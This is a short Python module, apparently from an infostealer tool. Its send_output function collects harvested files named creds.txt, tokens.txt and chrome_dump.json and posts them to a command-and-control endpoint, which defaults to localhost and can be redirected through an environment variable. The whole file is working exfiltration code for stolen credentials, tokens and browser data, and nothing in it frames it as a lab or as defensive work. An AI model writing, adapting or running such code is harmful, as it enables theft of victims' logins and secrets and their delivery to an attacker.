import os
import json
import requests
from colorama import Fore, Style

DEFAULT_C2_URL = "http://127.0.0.1:8000/api/collect"
LOGSENTINEL_WEBHOOK = os.environ.get("LOGSENTINEL_URL", "")  # Optional override

def send_output():
    target_url = LOGSENTINEL_WEBHOOK if LOGSENTINEL_WEBHOOK else DEFAULT_C2_URL
    payload = {}

    try:
        for file in ["creds.txt", "tokens.txt", "chrome_dump.json"]:
            full_path = os.path.join("output", file)
            if not os.path.exists(full_path):
                continue
            with open(full_path, "r", encoding="utf-8") as f:
                payload[file] = f.read()

        if not payload:
            print(Fore.YELLOW + "[!] No output files found to send." + Style.RESET_ALL)
            return

        response = requests.post(target_url, json=payload, timeout=10)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+] Output successfully sent to {target_url}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[!] Server responded with status {response.status_code}" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"[!] Failed to send output: {e}" + Style.RESET_ALL)
